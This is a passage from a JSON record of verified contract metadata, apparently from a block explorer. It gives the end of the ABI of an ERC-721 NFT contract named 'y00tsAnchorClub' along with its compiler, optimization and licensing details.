"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"ownerOf\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"owners\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"price\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"safeTransferFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"safeTransferFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"operator\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"approved\",\"type\":\"bool\"}],\"name\":\"setApprovalForAll\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"string\",\"name\":\"baseuri_\",\"type\":\"string\"}],\"name\":\"setBaseUri\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bytes4\",\"name\":\"interfaceId\",\"type\":\"bytes4\"}],\"name\":\"supportsInterface\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toggleMintToCommunity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toggleMinting\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"index\",\"type\":\"uint256\"}],\"name\":\"tokenByIndex\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"index\",\"type\":\"uint256\"}],\"name\":\"tokenOfOwnerByIndex\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"tokenOwners\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_tokenId\",\"type\":\"uint256\"}],\"name\":\"tokenURI\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "y00tsAnchorClub", "CompilerVersion": "v0.8.13+commit.abaa5c0e", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "000000000000000000000000705b9dbd0d5607beafe12e2fb74d64268d3ba35f000000000000000000000000b19da06d7ebc85a91d25ee9fc5e1cae43eca2194", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://b233d247eb35026f05f0f47772ea438f558782c6359a520c48b6016335c37a11"}]}